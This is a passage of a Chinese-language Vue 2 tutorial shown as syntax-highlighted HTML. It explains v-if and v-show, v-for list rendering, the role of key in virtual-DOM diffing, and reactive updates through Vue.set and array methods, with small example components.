operator">&lt;</span>h2 v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"false"</span><span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"1 === 1"</span><span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> v<span class="token operator">-</span><span class="token keyword">else</span>和v<span class="token operator">-</span><span class="token keyword">else</span><span class="token operator">-</span><span class="token keyword">if</span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>div v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"n === 1"</span><span class="token operator">></span>Angular<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span><span class="token keyword">else</span><span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"n === 2"</span><span class="token operator">></span>React<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span><span class="token keyword">else</span><span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"n === 3"</span><span class="token operator">></span>Vue<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div v<span class="token operator">-</span><span class="token keyword">else</span><span class="token operator">></span>哈哈<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> v<span class="token operator">-</span><span class="token keyword">if</span>与template的配合使用 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>template v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"n === 1"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>你好<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>辉煌集团<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>北京<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌'</span><span class="token punctuation">,</span>n<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="2-v-show"><a href="#2-v-show" class="headerlink" title="2. v-show"></a>2. v-show</h3><p> ①写法: v-show = “表达式”</p><p> ②适用<br>  适用于切换频率较高的场景</p><p> ③特点<br>  不展示的DOM元素未被移除,仅仅是使用样式将其隐藏</p><h3 id="3-备注"><a href="#3-备注" class="headerlink" title="3.备注"></a>3.备注</h3><p> 使用v-if时,DOM元素可能无法获取到,而使用v-show,DOM元素一定可以获取到</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 使用v<span class="token operator">-</span>show做条件渲染 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>show<span class="token operator">=</span><span class="token string">"false"</span><span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>show<span class="token operator">=</span><span class="token string">"1 === 1"</span><span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌集团'</span><span class="token punctuation">,</span>n<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="十二、列表渲染"><a href="#十二、列表渲染" class="headerlink" title="十二、列表渲染"></a>十二、列表渲染</h2><h3 id="1-v-for"><a href="#1-v-for" class="headerlink" title="1. v-for"></a>1. v-for</h3><p> ①.用于展示列表数据</p><p> ②.语法：v-for=”(item, index) in xxx” :key=”yyy”</p><p> ③.可遍历：数组、对象、字符串(用的很少)、指定次数(用的很少)</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 遍历数组 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>人员列表（遍历数组）<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(p,index) of persons"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"index"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">.</span>age<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 遍历对象 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>汽车信息（遍历对象）<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(value,k) of car"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"k"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 遍历字符串 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>测试遍历字符串（用得少）<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(char,index) of str"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"index"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 遍历指定次数 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>测试遍历指定次数（用得少）<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(number,index) of 5"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"index"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">-</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>number<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>persons<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>id<span class="token operator">:</span><span class="token string">'001'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>id<span class="token operator">:</span><span class="token string">'002'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'李四'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">19</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>id<span class="token operator">:</span><span class="token string">'003'</span><span class="token punctuation">,</span>name<span class="token operator">:</span><span class="token string">'王五'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>car<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'奥迪A8'</span><span class="token punctuation">,</span>price<span class="token operator">:</span><span class="token string">'70万'</span><span class="token punctuation">,</span>color<span class="token operator">:</span><span class="token string">'黑色'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>str<span class="token operator">:</span><span class="token string">'hello'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="2-Vue中的key有什么作用-key的内部原理"><a href="#2-Vue中的key有什么作用-key的内部原理" class="headerlink" title="2. Vue中的key有什么作用(key的内部原理)"></a>2. Vue中的key有什么作用(key的内部原理)</h3><h4 id="2-1-虚拟DOM中key的作用"><a href="#2-1-虚拟DOM中key的作用" class="headerlink" title="2.1 虚拟DOM中key的作用"></a>2.1 虚拟DOM中key的作用</h4><p> key是虚拟DOM对象的标识,当数据发生变化时,Vue会根据新数据生成新的虚拟DOM,随后Vue进行新虚拟DOM与旧虚拟DOM的差异比较</p><h4 id="2-2-比较规则"><a href="#2-2-比较规则" class="headerlink" title="2.2 比较规则"></a>2.2 比较规则</h4><p> (1)旧虚拟DOM中找到了与新虚拟DOM相同的key<br>  ①若虚拟DOM中内容没变,直接使用之前的真实DOM!</p><p>  ②若虚拟DOM中内容变了,则生成新的真实DOM,随后替换掉页面中之前的真实DOM</p><p> (2)旧虚拟DOM中未找到与新虚拟DOM相同的key<br>  创建新的真实DOM,随后渲染到页面</p><h4 id="2-3-用index作为key会引发的问题"><a href="#2-3-用index作为key会引发的问题" class="headerlink" title="2.3 用index作为key会引发的问题"></a>2.3 用index作为key会引发的问题</h4><p> ①若对数据进行:逆序添加、逆序删除等破坏顺序操作:<br>  Ⅰ.会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题,但效率低</p><p>  Ⅱ.如果结构中包含输入类的DOM:<br>   会产生错误的DOM更新 ===&gt; 界面出现问题</p><h4 id="2-4-开发中如何选择key"><a href="#2-4-开发中如何选择key" class="headerlink" title="2.4 开发中如何选择key"></a>2.4 开发中如何选择key</h4><p> (1)最好使用每条数据的唯一标识作为key,比如id、手机号、身份证号、学号等唯一值</p><p> (2)如果不存在对数据进行逆序添加、逆序删除等破坏顺序的操作,仅仅用于渲染列表用于展示,使用index作为key是没有问题的</p><h2 id="十三、Vue监视数据的原理"><a href="#十三、Vue监视数据的原理" class="headerlink" title="十三、Vue监视数据的原理"></a>十三、Vue监视数据的原理</h2><h3 id="1-监视数据"><a href="#1-监视数据" class="headerlink" title="1. 监视数据"></a>1. 监视数据</h3><p> Vue会监视data中所有层次的数据</p><h3 id="2-如何监测对象中的数据"><a href="#2-如何监测对象中的数据" class="headerlink" title="2. 如何监测对象中的数据"></a>2. 如何监测对象中的数据</h3><p> 通过setter实现监视,且要在new Vue时,就要传入要监测的数据<br> (1)对象中后追加的属性,Vue默认不做响应式</p><p> (2)如需给后添加的属性做响应式,请使用如下API<br>  Vue.set(target，propertyName/index，value) 或<br>  vm.$set(target，propertyName/index，value)</p>  <pre class="language-js" data-language="js"><code class="language-js">   <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>h1<span class="token operator">></span>学生信息<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"addSex"</span><span class="token operator">></span>添加一个性别属性，默认值是男<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span>h2<span class="token operator">></span>姓名：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>    <span class="token operator">&lt;</span>h2 v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"student.sex"</span><span class="token operator">></span>性别：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>sex<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>    <span class="token operator">&lt;</span>h2<span class="token operator">></span>年龄：真实<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>age<span class="token punctuation">.</span>rAge<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>，对外<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>age<span class="token punctuation">.</span>sAge<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>    <span class="token operator">&lt;</span>h2<span class="token operator">></span>朋友们<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>    <span class="token operator">&lt;</span>ul<span class="token operator">></span>      <span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(f,index) in student.friends"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"index"</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>f<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>f<span class="token punctuation">.</span>age<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">//阻止 vue 在启动时生成生产提示。</span>  <span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      student<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        name<span class="token operator">:</span> <span class="token string">'tom'</span><span class="token punctuation">,</span>        age<span class="token operator">:</span> <span class="token punctuation">&#123;</span>          rAge<span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>          sAge<span class="token operator">:</span> <span class="token number">29</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        friends<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>            name<span class="token operator">:</span> <span class="token string">'jerry'</span><span class="token punctuation">,</span>            age<span class="token operator">:</span> <span class="token number">35</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token punctuation">&#123;</span>            name<span class="token operator">:</span> <span class="token string">'tony'</span><span class="token punctuation">,</span>            age<span class="token operator">:</span> <span class="token number">36</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token function">addSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 第一种写法</span>        <span class="token comment">// Vue.set(this.student,'sex','男')</span>        <span class="token comment">// 第二种写法</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="3-如何监视数组中的数据"><a href="#3-如何监视数组中的数据" class="headerlink" title="3. 如何监视数组中的数据"></a>3. 如何监视数组中的数据</h3><p> 通过包裹数组更新元素的方法实现,本质上就做了两件事情:<br>  ①调用原生对应的方法对数组进行更新<br>  ②重新解析模板,进而更新页面</p><h3 id="4-Vue中修改数组中的某个元素一定要用如下方法"><a href="#4-Vue中修改数组中的某个元素一定要用如下方法" class="headerlink" title="4. Vue中修改数组中的某个元素一定要用如下方法"></a>4. Vue中修改数组中的某个元素一定要用如下方法</h3><p> ①.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</p><p> ②.Vue.set() 或 vm.$set()</p><h3 id="5-特别注意"><a href="#5-特别注意" class="headerlink" title="5. 特别注意"></a>5. 特别注意</h3><p> Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！</p> <pre class="language-js" data-language="js"><code class="language-js">  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>h1<span class="token operator">></span>学生信息<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"student.age++"</span><span class="token operator">></span>年龄<span class="token operator">+</span><span class="token number">1</span>岁<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"addSex"</span><span class="token operator">></span>添加性别属性，默认值：男<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"student.sex = '未知' "</span><span class="token operator">></span>修改性别<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"addFriend"</span><span class="token operator">></span>在列表首位添加一个朋友<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"updateFirstFriendName"</span><span class="token operator">></span>修改第一个朋友的名字为：张三<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"addHobby"</span><span class="token operator">></span>添加一个爱好<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"updateHobby"</span><span class="token operator">></span>修改第一个爱好为：开车<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"removeSmoke"</span><span class="token operator">></span>过滤掉爱好中的抽烟<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span> <span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>h3<span class="token operator">></span>姓名：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>    <span class="token operator">&lt;</span>h3<span class="token operator">></span>年龄：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>age<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>    <span class="token operator">&lt;</span>h3 v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"student.sex"</span><span class="token operator">></span>性别：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>student<span class="token punctuation">.</span>sex<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>    <span class="token operator">&lt;</span>h3<span class="token operator">></span>爱好：<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>    <span class="token operator">&lt;</span>ul<span class="token operator">></span>      <span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(h,index) in student.hobby"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"index"</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>h<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span>    <span class="token operator">&lt;</span>h3<span class="token operator">></span>朋友们：<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span>    <span class="token operator">&lt;</span>ul<span class="token operator">></span>      <span class="token operator">&lt;</span>li v<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token string">"(f,index) in student.friends"</span> <span class="token operator">:</span>key<span class="token operator">=</span><span class="token string">"index"</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>f<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>f<span class="token punctuation">.</span>age<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span>  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>  <span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    el<span class="token operator">:</span> <span class="token string">'#root'</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      student<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        name<span class="token operator">:</span> <span class="token string">'tom'</span><span class="token punctuation">,</span>        age<span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>        hobby<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'抽烟'</span><span class="token punctuation">,</span> <span class="token string">'喝酒'</span><span class="token punctuation">,</span> <span class="token string">'烫头'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        friends<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>            name<span class="token operator">:</span> <span class="token string">'jerry'</span><span class="token punctuation">,</span>            age<span class="token operator">:</span> <span class="token number">35</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token punctuation">&#123;</span>            name<span class="token operator">:</span> <span class="token string">'tony'</span><span class="token punctuation">,</span>            age<span class="token operator">:</span> <span class="token number">36</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token function">addSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Vue.set(this.student,'sex','男')</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function">addFriend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>friends<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>          name<span class="token operator">:</span> <span class="token string">'jack'</span><span class="token punctuation">,</span>          age<span class="token operator">:</span> <span class="token number">70</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function">updateFirstFriendName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token 